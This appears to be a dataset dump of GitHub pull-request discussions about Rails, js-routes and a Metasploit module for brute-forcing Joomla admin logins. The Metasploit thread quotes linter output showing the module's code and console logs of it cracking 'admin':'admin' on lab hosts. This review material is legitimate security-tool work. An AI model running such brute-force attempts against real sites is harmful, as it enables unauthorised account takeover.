`ActionView::TemplateRenderer` do the checking. If the template for the default render isn\'t found, then `ActionView::MissingTemplate` gets raised and the error shows up in the browser just as before. Here\'s a quick hack that demonstrates the idea:\r\n\r\n```ruby\r\ndef default_render(*args)\r\n   if request.format == Mime[:html]\r\n     render(*args)\r\n  end\r\n\r\n  # current implementation for all other formats\r\n  # which returns a 204 if the template is missing\r\nend\r\n```\r\n\r\nI realize I\'m really late to this party and may be missing subtleties that were addressed in the original discussion. Is there general interest in a pull request along these lines that raises a `MissingTemplate` exception for browser requests (the default behavior pre-Rails 5) rather than returning a 204? \r\n\r\nAny help or guidance is appreciated. ', ""@clarkware yeah, do open a pull request. :heart: \r\n\r\nYour suggestion also comports with @matthewd's here: https://github.com/rails/rails/issues/19036#issuecomment-171103997 and https://github.com/rails/rails/issues/19036#issuecomment-171111678"", ""Yeah, I think the only potential challenge will be in finding the right way of defining an `interactive_browser_request?`. Maybe 'html && !xhr' is sufficient? It feels like something we should have prior art on, but nothing specific is coming to mind."", ""That is my concern as well. For instance, a potentially interesting side\neffect of the 204 is that you can GET request without the browser changing\npages. This could allow graceful fallback for scriptless support. Maybe\nthat isn't a use case, but it made me pause and consider what\nan interactive request definition might have to overcome.\n\n-- \n\n\n\n\nSteve Bussey   \xe2\x80\xa2 SalesLoft\n\n\n\xe2\x80\xa2 Software Engineer\n\n\ne steve.bussey@salesloft.com   w salesloft.com\n<http://salesloft.com/?v=1&utm_expid=76406993-1.E5ncJhwyTAW9uGaR1WdBTA.1?utm_source=Email-Signature-Rescue&utm_medium=Email-Signature&utm_campaign=Email-Signature-Rescue>\n\n\na 3423 Piedmont Rd NE, Atlanta, GA 30305\n\n\n[image: Facebook] <https://www.facebook.com/SalesLoft>   [image: Twitter]\n<https://twitter.com/SalesLoft>   [image: Linkedin]\n<https://www.linkedin.com/company/salesloft>   [image: wordpress]\n<http://blog.salesloft.com/blog/>   [image:\nhttp://salesloft.com/prospector/#video]\n<http://salesloft.com/prospector/#video>     [image: Software Engineer Logo]\n<http://salesloft.com/?v=1&utm_expid=76406993-1.E5ncJhwyTAW9uGaR1WdBTA.1?utm_source=Email-Signature-Rescue&utm_medium=Email-Signature&utm_campaign=Email-Signature-Rescue>\n""]"
529,rails/rails,19652.0,"use singular table name if pluralize_table_names is setted as false while creating foreign key

Closes #19643","['@meinac could you add a test-case to prevent against regressions?', ""@senny I've created a test case for this situation."", '@senny what about this?', '@senny I believe this is ok now :)\r\nI have to drop testing_parents table before the testing table because foreign key constraint will fail if I try to drop testing table before testing_parents table. ', ""I've remove drop table for testing_parents table because I'm removing foreign key from this table inside of the test case so don't need to drop this table before testing table"", ""@meinac thank you.\r\n\r\nI'll look into a backport to `4-2-stable`.""]"
530,rails/rails,19688.0,"Let's say you have both uniqueness and range validation for PostgreSQL 4 byte integer column:
```ruby
class A < ActiveRecord::Base
  PG_MAX_INT = 2147483647
  validates :number, uniqueness: true, inclusion: { 0..PG_MAX_INT }
end

a = A.create(number: (A::PG_MAX_INT + 1))
```
Before it will raise this:
```ruby
RangeError: 2147483648 is out of range for ActiveRecord::ConnectionAdapters::PostgreSQL::OID::Integer with limit 4
```

Now:
```ruby
a.errors[:number] =>
['is not included in the list'] 
```","['If it complies please port to 4-2-stable as well (real project problem).', 'Does it make difference if you define the inclusion validation before the uniqueness validation?', ""@rafaelfranca No - it's rather for test reproductability. Logically - just to look for uniqueness we are trying to find same value in this column by building association with the same conditions. It crashes on try to get the same value that cannot exist for this kind of adapter - so it definetly unique because it cannot exist at all => uniqueness validation should pass - it will raise relevant exception on persist phase  without any other validations. Range validation should trigger before persist phase => no exception raised and model has 'is not included in the list'\r\n\r\nP.S. I wrote the test that reveals validation declaration order changs nothing. (So it was in my project)"", 'Squashed.', 'Rather than specifically handling the uniqueness validation, I wonder if it would make more sense to change `exists?` to always return false if it catches a `RangeError`. @rafaelfranca @chancancode wdyt?', '@sgrif Done.', '@sgrif seems good :+1:', '@Antiarchitect Can you update your patch to have `exists?` handle `RangeError` instead of this solution?', ""@sgrif Seems like I can't find where `exists?` for relation is implemented. I can rescue in build_relation though. I will fix if you drop me a hint."", ""We definitely should not rescue in build_relation.\n\nOn Wed, Apr 8, 2015, 10:29 AM Andrey Voronkov <notifications@github.com>\nwrote:\n\n> @sgrif <https://github.com/sgrif> Seems like I can't find where exists?\n> for relation is implemented. I can rescue in build_relation though.\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/rails/rails/pull/19688#issuecomment-90966936>.\n>\n"", 'ActiveRecord internals are like deep dark forest to me for now. Seems like exception is raised here:\r\nhttps://github.com/Antiarchitect/rails/blob/fix_uniqueness_validation_when_value_is_out_of_range/activerecord/lib/active_record/validations/uniqueness.rb#L65\r\nSo relation have no control over it.', ""@sgrif shouldn't we? I was about to suggest that before @Antiarchitect commented."", ""Yeah sorry I didn't see the code changes. Reviewing now. Ignore previous comment. "", 'Yes, you are both correct, I misinterpreted the previous comments. And as mentioned handling this in `exists?` will not solve anything. This impl is fine.', 'Thanks. I went ahead and fixed a few more nitpicks manually during the merge. For the record, they were:\r\n\r\n- Made the changelog entry more specific\r\n- Removed unnecessary parenthesis on addition in the tests\r\n- Removed this if PG check since this has nothing to do with PG\r\n- Renamed the constant to `INT_MAX_VALUE`', '@sgrif @rafaelfranca @matthewd Please somebody port it to 4-2-stable.\r\n', '64d31aa']"
531,rails/rails,20056.0,"When a job is added to Sidekiq or Que by ActiveJob, make sure we still can get the
original job_id provider by Sidekiq or Que. We do this by adding the Sidekiq jid or Que job_id to
provider_job_id field on the job object.

Partly fixes #18821

This PR is an extension on the PR submitted by @kddeisz : https://github.com/rails/rails/pull/19910
","['Thank you!  This is a pretty critical integration point with Sidekiq since all its APIs require the JID to work.', 'Added Que job_id reporting as well.', 'Nice work @jvanbaarsen', '@jvanbaarsen could you rebase your branch? Thanks', '@rafaelfranca Yes! will do', ""You might also want to make your adapter tests use the same test as the\ndelayed job one now - and just check for not null. We don't need both tests.\n\nOn Thu, May 7, 2015 at 3:48 PM, Jeroen van Baarsen <notifications@github.com\n> wrote:\n\n> @rafaelfranca <https://github.com/rafaelfranca> Yes! will do\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/rails/rails/pull/20056#issuecomment-99994061>.\n>\n\n\n\n-- \n*Kevin D. Deisz*\n*TrialNetworks* - part of DrugDev\nSoftware Developer\n383 Elliot Street, Suite G\nNewton, MA 02464\n+1 617.952.4071 x134 (office)\n+1 703.615.0396 (mobile)\nkdeisz@trialnetworks.com\n"", '@kddeisz Ah yeah, good point! Will do as well', '@rafaelfranca You want me to squash the commits as well?', 'It is fine these two commits', '@rafaelfranca I think its ready to be merged (Once the tests are green :dancer: )', 'Will this get into 4.2 or 5+ only?', '5+ only.', ""@mperham So, in current versions there's no way to find the underlying `jid` from Sidekiq using ActiveJob?"", ""Not that I'm aware of. \n\n> On May 20, 2015, at 05:58, Didde Brockman <notifications@github.com> wrote:\n> \n> @mperham So, in current versions there's no way to find the underlying jid from Sidekiq using ActiveJob?\n> \n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub.\n> \n"", '@diddeb Not out of the box. Only way you can achieve this, is by monkeypatching.', 'Thanks @jvanbaarsen + @mperham... Freedom Patching it is.']"
532,railsware/js-routes,137.0,"This PR is an alternative to #131, #132, and fixes #127.

### New Features:
* Adds support for specifying a default protocol, host, and port in `default_url_options`.
* Adds support for routes which specify a specific protocol, host, or port.

### Changes:
* Changes expectation of `url_links` to a boolean value and deprecates the previous usage. Default protocol, host, and port are now configured with `default_url_options`.","['@le0pard @bogdan With this pull request, I started over from scratch, just implementing the basic necessary features while keeping support for server-side JavaScript usage. Please review.', 'Looks good! :+1: ', 'What do you think about configuring Rails with `default_url_options` during doing tests so that we always use rails `_url` helper as expected value on the right side? I think only in this way we can get things consistent.\r\n', '@bogdan I think that might be a good long-term goal. However, I think there are some reasons why we would not want to do that right now. js-routes provides its own configuration of `default_url_options` so the routes that are generated, so the default values may be different than those specified in the application. Specifying `default_url_options` in Rails would override the values specified in js-routes config. Maybe a long-term goal should be to remove the js-routes `default_url_options` config and instead rely on `Rails.application.routes.default_url_options`.\r\n\r\nI think the tests are good right now because they explicitly show the expected value, rather than obscuring it in a variable.', 'I remember we were talking about default port to be `window.location.port`. Why did we decide to skip it?\r\n\r\n', ""@bogdan I implemented that feature in #132, but @le0pard mentioned that referencing `window.location` would break server-side usage, so I created this new pull request which does not include any `window.location` defaults. I'm planning to submit another pull request (after this one is merged) which reintroduces using `window.location` for defaults."", 'We need to prevent warnings in the test suite:\r\n\r\nhttp://monosnap.com/image/Rx528u4Z05jJiPjaLX0iaVFDbJrmMr.png', '@bogdan I have added a line to `spec_helper.rb` which silences the deprecation warnings.', '@bogdan @le0pard Can we approve and merge this today?', '@andrewhavens I can merge it, but main contributor is @bogdan and he always has the final decision.', 'It is bad to just silence all warnings for entire suite. We will not know when we will use rails deprecated calls.\r\n\r\nWe need to disable warnings only for tests that produce them.\r\n\r\n', 'I agree. How do you suggest that we achieve that?\r\n\r\n\r\nOn Monday, Dec 15, 2014 at 5:33 PM, Bogdan Gusiev <notifications@github.com>, wrote:\r\n\r\nIt is bad to just silence all warnings for entire suite. We will not know when we will use rails deprecated calls.\r\n\r\n\r\nWe need to disable warnings only for tests that produce them.\r\n\r\n\r\n\xe2\x80\x94\r\nReply to this email directly or view it on GitHub.', 'From activesupport docs:\r\n\r\n```\r\n      # Silence deprecation warnings within the block.\r\n      #\r\n      #   ActiveSupport::Deprecation.warn(\'something broke!\')\r\n      #   # => ""DEPRECATION WARNING: something broke! (called from your_code.rb:1)""\r\n      #\r\n      #   ActiveSupport::Deprecation.silence do\r\n      #     ActiveSupport::Deprecation.warn(\'something broke!\')\r\n      #   end\r\n      #   # => nil\r\n```\r\n\r\n``` ruby\r\naround(:each) do |example|\r\n  ActiveSupport::Deprecation.silence do\r\n    example.run\r\n  end\r\nend\r\n```', '@bogdan I have moved the deprecation silencer to a block, as you have recommended, and applied it to only the specs that generate deprecation warnings. Please review', 'Merged.\r\n\r\nThanks everyone for hard work and patience. Especially @andrewhavens. This one was really hard.', ':+1: :cool:\r\n\r\nNow my pull request: https://github.com/railsware/js-routes/pull/135']"
533,rapid7/metasploit-framework,3532.0,Module that allows Bruteforce to Joomla 2.5 and 3.0,"[""@jvazquez-r7 This module is in Spanish so if you don't mind could you please process it?"", 'reviewing....', 'This module needs to be msftidy compliant before we can go ahead:\r\n\r\n```\r\n$ tools/msftidy.rb modules/auxiliary/scanner/http/http_bruteforce_joomla.rb\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:40 - [WARNING] Space-Tab mixed indent: "" \\tOptString.new(\'USER_VARIABLE\', [ false, \\""The name of the variable for the user field\\"", \\""username\\""]),\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:41 - [WARNING] Space-Tab mixed indent: "" \\tOptString.new(\'PASS_VARIABLE\', [ false, \\""The name of the variable for the password field\\"" , \\""passwd\\""]),\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:42 - [WARNING] Space-Tab mixed indent: "" \\tOptString.new(\'WORD_ERROR\', [ false, \\""The word of message for detect that login fail\\"",\\""mod-login-username\\""]),\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:43 - [WARNING] Space-Tab mixed indent: "" \\tOptString.new(\'WORD_ERROR_2\', [ false, \\""Second option for the word of message for detect that login fail\\"",\\""login.html\\""]),\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:45 - [WARNING] Space-Tab mixed indent: ""\\t OptInt.new(\'TIME_DELAY\', [false, \'The delay time \', 0]),\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:45 - [WARNING] Tabbed indent: ""\\t OptInt.new(\'TIME_DELAY\', [false, \'The delay time \', 0]),\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:112 - [WARNING] Space-Tab mixed indent: "" \\tdatastore[\'REQUESTTYPE\'] = time_delay\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:112 - [INFO] datastore is modified in code: datastore[\'REQUESTTYPE\'] = time_delay\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:113 - [WARNING] Space-Tab mixed indent: ""\\t do_login(user, pass)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:113 - [WARNING] Tabbed indent: ""\\t do_login(user, pass)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:129 - [WARNING] Space-Tab mixed indent: "" \\tif result == :delay\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:130 - [WARNING] Space-Tab mixed indent: ""\\t\\t print_status(\\""Establishing one minute delay\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:130 - [WARNING] Tabbed indent: ""\\t\\t print_status(\\""Establishing one minute delay\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:131 - [WARNING] Space-Tab mixed indent: ""\\t\\t userpass_sleep_interval_add\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:131 - [WARNING] Tabbed indent: ""\\t\\t userpass_sleep_interval_add\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:138 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:143 - [WARNING] Space-Tab mixed indent: "" \\t@uri_mod = \\""\\#{@uri}?username=\\#{user}&psd=\\#{pass}\\""\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:144 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:144 - [WARNING] Space-Tab mixed indent: "" \\t\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:152 - [WARNING] Space-Tab mixed indent: ""\\t return response\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:152 - [WARNING] Tabbed indent: ""\\t return response\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:153 - [WARNING] Space-Tab mixed indent: "" \\t rescue ::Rex::ConnectionError\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:154 - [WARNING] Space-Tab mixed indent: "" \\t\\tvprint_error(\\""\\#{target_url} - Failed to connect to the web server\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:155 - [WARNING] Space-Tab mixed indent: "" \\t\\treturn nil\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:156 - [WARNING] Space-Tab mixed indent: "" \\tend\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:159 - [WARNING] Space-Tab mixed indent: "" \\t begin\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:173 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:174 - [WARNING] Space-Tab mixed indent: "" \\tvalue_cookie = value_cookie + \\""\\#{val_uid.strip}=\\#{cval[indice].strip};\\""\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:175 - [WARNING] Space-Tab mixed indent: "" \\tindice = indice +1\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:193 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:194 - [WARNING] Space-Tab mixed indent: "" \\t{\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:195 - [WARNING] Space-Tab mixed indent: "" \\t\'Content-Type\' => ctype,\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:196 - [WARNING] Space-Tab mixed indent: "" \\t\'Referer\' => referer_var,\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:197 - [WARNING] Space-Tab mixed indent: "" \\t\'User-Agent\' => datastore[\'UserAgent\'],\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:198 - [WARNING] Space-Tab mixed indent: "" \\t},\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:204 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:212 - [WARNING] Space-Tab mixed indent: "" \\t}, 30)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:218 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:222 - [WARNING] Space-Tab mixed indent: "" \\t end\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:223 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:232 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:232 - [WARNING] Tabbed indent: ""\\t\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:233 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:234 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:236 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:236 - [WARNING] Space-Tab mixed indent: "" \\tif response.to_s.include? datastore[\'WORD_ERROR_DELAY\'] \\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:237 - [WARNING] Space-Tab mixed indent: "" \\t\\treturn :delay\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:238 - [WARNING] Space-Tab mixed indent: "" \\telse\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:239 - [WARNING] Space-Tab mixed indent: "" \\t\\tif response.to_s.include? datastore[\'WORD_ERROR\'] or response.to_s.include? datastore[\'WORD_ERROR_2\']\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:240 - [WARNING] Space-Tab mixed indent: "" \\t\\t\\treturn :fail\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:241 - [WARNING] Space-Tab mixed indent: "" \\t\\telse\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:242 - [WARNING] Space-Tab mixed indent: "" \\t\\t\\treturn :success\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:243 - [WARNING] Space-Tab mixed indent: "" \\t\\tend\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:244 - [WARNING] Space-Tab mixed indent: "" \\tend\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:255 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:273 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:273 - [WARNING] Space-Tab mixed indent: "" \\t\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:274 - [WARNING] Do not read Set-Cookie header directly, use res.get_cookies instead: if res and res.code == 200 and res.headers[\'Set-Cookie\']\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:275 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:277 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:277 - [WARNING] Tabbed indent: ""\\t\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:278 - [WARNING] Space-Tab mixed indent: "" \\t\\t#form = res.body.split(/<form action=([^\\\\>]+) id=\\""login-form\\"" class=\\""form-inline\\""\\\\>(.*)<\\\\/form>/mi)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:279 - [WARNING] Space-Tab mixed indent: "" \\t\\tform = res.body.split(/<form action=([^\\\\>]+) method=\\""post\\"" id=\\""form-login\\""\\\\>(.*)<\\\\/form>/mi)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:280 - [WARNING] Space-Tab mixed indent: "" \\t\\t#print_status(\\""\\#{form[1]}\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:287 - [WARNING] Space-Tab mixed indent: "" \\t\\tif not form\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:288 - [WARNING] Space-Tab mixed indent: "" \\t\\t\\tprint_error(\\""Joomla Form Not Found\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:289 - [WARNING] Space-Tab mixed indent: "" \\t\\t\\tform = res.body.split(/<form id=\\""login-form\\"" action=([^\\\\>]+)\\\\>(.*)<\\\\/form>/mi)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:290 - [WARNING] Space-Tab mixed indent: "" \\t\\tend\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:291 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:291 - [WARNING] Space-Tab mixed indent: "" \\t\\t\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:292 - [WARNING] Space-Tab mixed indent: "" \\t\\tinput_hidden = form[2].split(/<input type=\\""hidden\\""([^\\\\>]+)\\\\/>/mi)\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:293 - [WARNING] Space-Tab mixed indent: "" \\t\\t#print_status(\\""Formulario Encontrado \\#{form[2]}\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:294 - [WARNING] Space-Tab mixed indent: "" \\t\\tprint_status(\\""--------> Joomla Form Found <--------\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:295 - [WARNING] Space-Tab mixed indent: "" \\t\\t#print_status(\\""Campos Ocultos \\#{input_hidden[7]}\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:296 - [WARNING] Space-Tab mixed indent: "" \\t\\tinput_id = input_hidden[7].split(\\""\\\\\\""\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:297 - [WARNING] Space-Tab mixed indent: "" \\t\\t#print_status(\\""valor \\#{input_id[1]}\\"")\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:298 - [WARNING] Space-Tab mixed indent: "" \\t\\tvalor_input_id = input_id[1]\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:305 - [WARNING] Do not read Set-Cookie header directly, use res.get_cookies instead: res.headers[\'Set-Cookie\'].split(\';\').each {|c|\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:306 - [WARNING] Spaces at EOL\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:307 - [WARNING] Space-Tab mixed indent: ""\\t uid.push(c.split(\'=\')[0])\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb:307 - [WARNING] Tabbed indent: ""\\t uid.push(c.split(\'=\')[0])\\n""\r\nmodules/auxiliary/scanner/http/http_bruteforce_joomla.rb - [INFO] Please add a newline at the end of the file\r\n```', 'Please change the module file name to ```joomla_bruteforce_login.rb```, since there are other ```joomla_*``` already in the folder.', 'Please use https://github.com/bbatsov/ruby-style-guide recommendations, when possible. Thanks!!!', 'Thanks @luisco, working on it!', 'Thanks @luisco landed.\r\n\r\nI had to do several cleanup, see final result here: https://github.com/rapid7/metasploit-framework/commit/fe0b6fa79e9333e749f914baec0a59a4449e43c7\r\n\r\nFeel free to review / test and make a new pull request if I busted something. It \'s working okey on my testings:\r\n\r\n* Joomla 3.3\r\n\r\n```\r\nmsf > use auxiliary/scanner/http/joomla_bruteforce_login\r\nmsf auxiliary(joomla_bruteforce_login) > workspace -a joomla\r\n[*] Added workspace: joomla\r\nmsf auxiliary(joomla_bruteforce_login) > set rhosts 172.16.158.219\r\nrhosts => 172.16.158.219\r\nmsf auxiliary(joomla_bruteforce_login) > set AUTH_URI /joomla3/administrator/index.php\r\nAUTH_URI => /joomla3/administrator/index.php\r\nmsf auxiliary(joomla_bruteforce_login) > set FORM_URI /joomla3/administrator\r\nFORM_URI => /joomla3/administrator\r\nmsf auxiliary(joomla_bruteforce_login) > set PASS_FILE """"\r\nPASS_FILE =>\r\nmsf auxiliary(joomla_bruteforce_login) > set USER_FILE """"\r\nUSER_FILE =>\r\nmsf auxiliary(joomla_bruteforce_login) > set USERPASS_FILE """"\r\nUSERPASS_FILE =>\r\nmsf auxiliary(joomla_bruteforce_login) > set USERNAME juan\r\nUSERNAME => juan\r\nmsf auxiliary(joomla_bruteforce_login) > set PASSWORD juan\r\nPASSWORD => juan\r\nmsf auxiliary(joomla_bruteforce_login) > run\r\n\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - Searching Joomla authentication URI...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - /joomla3/administrator/index.php - Attempting to login...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Trying username:\'juan\' with password:\'juan\'\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Searching Joomla Login Response...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Searching Joomla Login Form...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Testing Joomla 2.5 Form...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Testing Form Joomla 3.0 Form...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Searching Joomla Login Cookies...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Login with cookie ( a5260f140452f56bcfedd48a345478ec=hv5lph6fvk074r2i357qapt7f3; ) and Hidden ( 987ae88f58e29d0f8fdb22dd3eafb7fb=1 )\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Login Response 303\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Following redirect to http://172.16.158.219/joomla3/administrator/index.php...\r\n[-] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Failed to login as \'juan\'\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(joomla_bruteforce_login) > set USERNAME admin\r\nUSERNAME => admin\r\nmsf auxiliary(joomla_bruteforce_login) > set password admin\r\nrpassword => admin\r\nmsf auxiliary(joomla_bruteforce_login) > run\r\n\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - Searching Joomla authentication URI...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - /joomla3/administrator/index.php - Attempting to login...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Trying username:\'admin\' with password:\'admin\'\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Searching Joomla Login Response...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Searching Joomla Login Form...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Testing Joomla 2.5 Form...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Testing Form Joomla 3.0 Form...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Searching Joomla Login Cookies...\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Login with cookie ( a5260f140452f56bcfedd48a345478ec=cck11posus9lirlksgib7c11k4; ) and Hidden ( 9100245da128cf6da70240709990d9b1=1 )\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Login Response 303\r\n[*] 172.16.158.219:80 JOOMLA_BRUTEFORCE - [1/1] - /joomla3/administrator/index.php - Following redirect to http://172.16.158.219/joomla3/administrator/index.php...\r\n[+] http://172.16.158.219:80/joomla3/administrator/index.php - Successful login \'admin\' : \'admin\'\r\n[*] Scanned 1 of 1 hosts (100% complete)\r\n[*] Auxiliary module execution completed\r\nmsf auxiliary(joomla_bruteforce_login) > creds\r\n\r\nCredentials\r\n===========\r\n\r\nhost            port  user   pass   type       proof                                                     active?\r\n----            ----  ----   ----   ----       -----                                                     -------\r\n172.16.158.219  80    admin  admin  passsword  http://172.16.158.219:80/joomla3/administrator/index.php  true\r\n```\r\n\r\n* Joomla 2.5\r\n\r\n```\r\nmsf auxiliary(joomla_bruteforce_login) > set rhosts 172.16.158.218\r\nrhosts => 172.16.158.218\r\nmsf auxiliary(joomla_bruteforce_login) > show options\r\n\r\nModule options (auxiliary/scanner/http/joomla_bruteforce_login):\r\n\r\n   Name              Current Setting                   Required  Description\r\n   ----              ---------------                   --------  -----------\r\n   AUTH_URI          /joomla3/administrator/index.php  yes       The URI to authenticate against\r\n   BLANK_PASSWORDS   false                             no        Try blank passwords for all users\r\n   BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5\r\n   DB_ALL_CREDS      false                             no 